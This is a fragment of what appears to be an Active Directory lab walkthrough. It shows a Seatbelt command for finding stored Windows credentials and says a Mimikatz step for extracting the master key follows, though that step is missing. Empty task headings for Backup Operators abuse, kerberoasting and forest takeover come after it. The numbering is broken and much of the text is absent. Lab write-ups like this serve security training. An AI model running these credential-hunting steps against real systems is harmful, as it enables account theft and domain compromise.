1. One of the things I like to do when gaining access to a system is running [Seatbelt](https://github.com/GhostPack/Seatbelt). This tool will check many things like permissions, groups and for stored credentials. To run Seatbelt and do some of it checks we can run the following command:

```
.\Seatbelt.exe --group=user
```

2\. In the output of the section WindowsCredentialFiles we can see that the user `sa_sql` has some credentials saved:

![](<../../../../.gitbook/assets/image (17).png>)

4\. We can find the master encryption key id and some information about the saved credentials with the following Mimikatz command using the previous path and FileName:









### 12. Privileged groups

**Task: Become domain admin by abusing the "Backup Operators" group.**



### 13. Kerberoast

**Task: Check for interesting user attributes across the trust to `bank.local`.**



### 14. Take over Foresat

**Task: Take over the `bank.local` forest.**

